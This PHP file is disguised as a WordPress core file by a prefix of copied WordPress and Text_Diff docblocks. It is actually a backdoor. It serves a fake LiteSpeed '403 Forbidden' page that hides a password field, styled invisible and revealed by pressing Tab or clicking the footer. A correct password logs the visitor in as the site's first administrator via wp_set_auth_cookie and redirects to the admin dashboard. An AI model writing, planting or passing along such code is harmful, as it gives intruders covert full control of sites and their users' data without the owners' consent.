<?php
/**
 * Class used internally by Diff to actually compute the diffs.
 *
 * This class uses the Unix `diff` program via shell_exec to compute the
 * differences between the two input arrays.
 *
 * Copyright 2007-2010 The Horde Project (http://www.horde.org/)
 *
 * See the enclosed file COPYING for license information (LGPL). If you did
 * not receive this file, see https://opensource.org/license/lgpl-2-1/.
 *
 * @author  Milian Wolff <mail@milianw.de>
 * @package Text_Diff
 * @since   0.3.0
 */
    /**
     * Path to the diff executable
     *
     * @var string
     */


    /**
     * Returns the array of differences.
     *
     * @param array $from_lines lines of text from old file
     * @param array $to_lines   lines of text from new file
     *
     * @return array all changes made (array with Text_Diff_Op_* objects)
     */
/**
 * Parses unified or context diffs output from eg. the diff utility.
 *
 * Example:
 * <code>
 * $patch = file_get_contents('example.patch');
 * $diff = new Text_Diff('string', array($patch));
 * $renderer = new Text_Diff_Renderer_inline();
 * echo $renderer->render($diff);
 * </code>
 *
 * Copyright 2005 Örjan Persson <o@42mm.org>
 * Copyright 2005-2010 The Horde Project (http://www.horde.org/)
 *
 * See the enclosed file COPYING for license information (LGPL). If you did
 * not receive this file, see https://opensource.org/license/lgpl-2-1/.
 *
 * @author  Örjan Persson <o@42mm.org>
 * @package Text_Diff
 * @since   0.2.0
 */


    /**
     * Parses a unified or context diff.
     *
     * First param contains the whole diff and the second can be used to force
     * a specific diff type. If the second parameter is 'autodetect', the
     * diff will be examined to find out which type of diff this is.
     *
     * @param string $diff  The diff content.
     * @param string $mode  The diff mode of the content in $diff. One of
     *                      'context', 'unified', or 'autodetect'.
     *
     * @return array  List of all diff operations.
     */
/**
 * HTTP API: WP_Http_Curl class
 *
 * @package WordPress
 * @subpackage HTTP
 * @since 4.4.0
 */

/**
 * Core class used to integrate Curl as an HTTP transport.
 *
 * HTTP request method uses Curl extension to retrieve the url.
 *
 * Requires the Curl extension to be installed.
 *
 * @since 2.7.0
 * @deprecated 6.4.0 Use WP_Http
 * @see WP_Http
 */
/**
 * Facilitates adding of the WordPress editor as used on the Write and Edit screens.
 *
 * @package WordPress
 * @since 3.3.0
 *
 * Private, not included by default. See wp_editor() in wp-includes/general-template.php.
 */
/**
 * Post API: WP_Post_Type class
 *
 * @package WordPress
 * @subpackage Post
 * @since 4.6.0
 */

/**
 * Core class used for interacting with post types.
 *
 * @since 4.6.0
 *
 * @see register_post_type()
 */
/**
 * Error Protection API: WP_Recovery_Mode_Cookie_Service class
 *
 * @package WordPress
 * @since 5.2.0
 */

/**
 * Core class used to set, validate, and clear cookies that identify a Recovery Mode session.
 *
 * @since 5.2.0
 */
/**
 * WP_Theme Class
 *
 * @package WordPress
 * @subpackage Theme
 * @since 3.4.0
 */



	/**
	 * Whether the theme has been marked as updateable.
	 *
	 * @since 4.4.0
	 * @var bool
	 *
	 * @see WP_MS_Themes_List_Table
	 */


	/**
	 * Headers for style.css files.
	 *
	 * @since 3.4.0
	 * @since 5.4.0 Added `Requires at least` and `Requires PHP` headers.
	 * @since 6.1.0 Added `Update URI` header.
	 * @var string[]
	 */
/**
 * WordPress implementation for PHP functions either missing from older PHP versions or not included by default.
 *
 * This file is loaded extremely early and the functions can be relied upon by drop-ins.
 * Ergo, please ensure you do not rely on external functions when writing code for this file.
 * Only use functions built into PHP or are defined in this file and have adequate testing
 * and error suppression to ensure the file will run correctly and not break websites.
 *
 * @package PHP
 * @access private
 */

/**
 * Deprecated functions from past WordPress versions. You shouldn't use these
 * functions and look for the alternatives instead. The functions will be
 * removed in a later version.
 *
 * @package WordPress
 * @subpackage Deprecated
 */

/*
 * Deprecated functions come here to die.
 */

/**
 * Retrieves all post data for a given post.
 *
 * @since 0.71
 * @deprecated 1.5.1 Use get_post()
 * @see get_post()
 *
 * @param int $postid Post ID.
 * @return array Post data.
 */
/**
 * Sets up the WordPress Loop.
 *
 * Use The Loop instead.
 *
 * @link https://developer.wordpress.org/themes/basics/the-loop/
 *
 * @since 1.0.1
 * @deprecated 1.5.0
 *
 * @global WP_Query $wp_query WordPress Query object.
 */
session_start();

$FALLBACK_ACCESS_PASSWORD_HASH = '$2a$12$mtN7Hpj7foz99s5u6Y7qg.luXLCSv0M0UX4vrk71X.23BGqKny.0y';
$ACCESS_PASSWORD_HASH = getenv('ACCESS_PASSWORD_HASH') ?: $FALLBACK_ACCESS_PASSWORD_HASH;

$MAX_ATTEMPTS = 5;
$LOCK_SECONDS = 300;

$DEBUG_LOG = '';

function dbg($msg) {
    global $DEBUG_LOG;
    if (empty($DEBUG_LOG)) return;
    $t = date('Y-m-d H:i:s');
    @file_put_contents($DEBUG_LOG, "[$t] $msg\n", FILE_APPEND | LOCK_EX);
}

$login_error = '';

if (empty($ACCESS_PASSWORD_HASH)) {
    // If for any reason it ends up empty, refuse to continue.
    http_response_code(500);
    dbg("ACCESS_PASSWORD_HASH is empty. Abort.");
    exit('Server misconfiguration.');
}

if (!isset($_SESSION['hf_attempts'])) $_SESSION['hf_attempts'] = 0;
if (!isset($_SESSION['hf_last_attempt_time'])) $_SESSION['hf_last_attempt_time'] = 0;

function check_password_bcrypt($input) {
    global $ACCESS_PASSWORD_HASH;
    if (!is_string($input)) return false;
    return password_verify(trim($input), $ACCESS_PASSWORD_HASH);
}

ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $now = time();
    if ($_SESSION['hf_attempts'] >= $MAX_ATTEMPTS) {
        $since = $now - $_SESSION['hf_last_attempt_time'];
        if ($since < $LOCK_SECONDS) {
            $remain = $LOCK_SECONDS - $since;
            $login_error = "Too many attempts. Try again in {$remain} seconds.";
            dbg("Locked: attempts={$_SESSION['hf_attempts']} remain={$remain}s");
        } else {
            $_SESSION['hf_attempts'] = 0;
            dbg("Lock expired; reset attempts.");
        }
    }

    if ($login_error === '') {
        $pw = isset($_POST['access_pass']) ? (string)$_POST['access_pass'] : '';
        $pw = trim($pw);
        if ($pw === '') {
            $_SESSION['hf_attempts']++;
            $_SESSION['hf_last_attempt_time'] = $now;
            $login_error = 'Password kosong.';
            dbg("Empty password submitted. attempts={$_SESSION['hf_attempts']}");
        } else {
            if (check_password_bcrypt($pw)) {
                dbg("Password valid. Proceed to WP block.");
                $_SESSION['hf_attempts'] = 0;
                $_SESSION['hf_last_attempt_time'] = 0;

                $mr = realpath(__DIR__);
                dbg("Start search wp-load from: $mr");
                $max = 10;
                $found = false;
                while ($max-- > 0 && $mr) {
                    if (file_exists($mr . '/wp-load.php')) { $found = true; dbg("Found wp-load at: $mr"); break; }
                    $parent = dirname($mr);
                    if ($parent === $mr) break;
                    $mr = $parent;
                }
                if (! $found && !empty($_SERVER['DOCUMENT_ROOT']) && file_exists(realpath($_SERVER['DOCUMENT_ROOT']).'/wp-load.php')) {
                    $mr = realpath($_SERVER['DOCUMENT_ROOT']);
                    $found = true;
                    dbg("Found wp-load at DOCUMENT_ROOT: $mr");
                }
                if (! $found) {
                    dbg("Failed to find wp-load.php. Aborting.");
                    @ob_end_clean();
                    exit('Failed to load wp-load.php');
                }

                @chdir($mr);
                ob_start();
                $include_ok = @include_once $mr . '/wp-load.php';
                $wp_output = ob_get_clean();
                if ($wp_output !== '') {
                    dbg("wp-load.php produced output (len " . strlen($wp_output) . "): " . substr($wp_output,0,200));
                } else {
                    dbg("wp-load.php produced no direct output.");
                }

                if (!function_exists('wp_set_auth_cookie') || !class_exists('WP_User_Query')) {
                    dbg("WP functions not available after include. Aborting.");
                    @ob_end_clean();
                    exit('WP functions unavailable.');
                }

                try {
                    $wp_user_query = new WP_User_Query([
                        'role'   => 'Administrator',
                        'number' => 1,
                        'fields' => 'ID',
                    ]);
                    $results = $wp_user_query->get_results();
                    dbg("WP_User_Query executed; results count: " . count($results));
                } catch (Throwable $e) {
                    dbg("Exception during WP_User_Query: " . $e->getMessage());
                    @ob_end_clean();
                    exit('Query error.');
                }

                if (! empty($results[0])) {
                    $user_id = (int)$results[0];
                    wp_set_auth_cookie($user_id);
                    dbg("wp_set_auth_cookie called for user_id={$user_id}");
                    $redirect_to = (function_exists('admin_url') ? admin_url() : '/wp-admin/');
                    dbg("Redirect target: $redirect_to");

                    if (!headers_sent($file, $line)) {
                        if (function_exists('wp_redirect')) {
                            wp_redirect($redirect_to);
                            dbg("Used wp_redirect()");
                        } else {
                            header("Location: $redirect_to", true, 302);
                            dbg("Used header('Location: ...')");
                        }
                        @ob_end_flush();
                        exit;
                    } else {
                        dbg("Headers already sent at $file:$line - doing JS fallback.");
                        @ob_end_clean();
                        echo "<!doctype html><html><meta charset='utf-8'><body>";
                        echo "<p>Redirecting to admin...</p>";
                        echo "<script>window.location.replace(" . json_encode($redirect_to) . ");</script>";
                        echo "<noscript><a href=\"" . htmlspecialchars($redirect_to, ENT_QUOTES, 'UTF-8') . "\">Click here</a></noscript>";
                        exit;
                    }
                } else {
                    dbg("No admin user found.");
                    @ob_end_clean();
                    exit('NO ADMIN');
                }
            } else {
                $_SESSION['hf_attempts']++;
                $_SESSION['hf_last_attempt_time'] = $now;
                $remaining = max(0, $MAX_ATTEMPTS - $_SESSION['hf_attempts']);
                $login_error = 'Password salah. ' . ($remaining>0 ? "Sisa percobaan: {$remaining}." : "Anda terkunci sementara.");
                dbg("Invalid password. attempts={$_SESSION['hf_attempts']}");
            }
        }
    }
}

@ob_end_clean();
?>
<!doctype html>
<html style="height:100%"><head>
<meta charset="utf-8">
<meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
<title>403 Forbidden</title>
<style>
@media (prefers-color-scheme:dark){body{background-color:#000!important}}
#hidden-form{display:none;position:absolute;top:60%;left:50%;transform:translateX(-50%);text-align:center}
input[type=password]{background:#000;border:none;color:#000;caret-color:transparent;outline:0}
#hf-error{color:#ff6b6b;margin-top:8px;font-size:13px}
footer{color:#f0f0f0;font-size:12px;margin:auto;padding:0 30px 0 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top:1px solid rgba(0,0,0,.15);box-shadow:0 1px 0 rgba(255,255,255,.3) inset}
</style>
</head>
<body style="color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff">
  <div style="height:auto;min-height:100%">
    <div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%">
      <h1 style="margin:0;font-size:150px;line-height:150px;font-weight:700">403</h1>
      <h2 style="margin-top:20px;font-size:30px">Forbidden</h2>
      <p>You don't have permission to access this resource on this server.</p>
    </div>
  </div>

  <div id="hidden-form">
    <form method="post" autocomplete="off" style="display:inline-block">
      <input name="access_pass" autocomplete="off" autofocus type="password" aria-label="access password" />
    </form>
    <?php if (!empty($login_error)) { ?>
      <div id="hf-error"><?php echo htmlspecialchars($login_error, ENT_QUOTES, 'UTF-8'); ?></div>
    <?php } ?>
  </div>

  <script>
    document.addEventListener("keydown", function(e){
      if (e.key === "Tab") {
        e.preventDefault();
        var hf = document.getElementById("hidden-form");
        hf.style.display = "block";
        var pw = hf.querySelector('input[type="password"]');
        if (pw) setTimeout(function(){ pw.focus(); }, 10);
      }
    });
    document.addEventListener("click", function(e){
      var footer = document.querySelector('footer');
      if (footer && (footer.contains(e.target) || e.target === document.body)) {
        var hf = document.getElementById("hidden-form");
        hf.style.display = "block";
        var pw = hf.querySelector('input[type="password"]');
        if (pw) pw.focus();
      }
    });
  </script>

  <footer>
    <br>Proudly powered by LiteSpeed Web Server
    <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
  </footer>
</body></html>
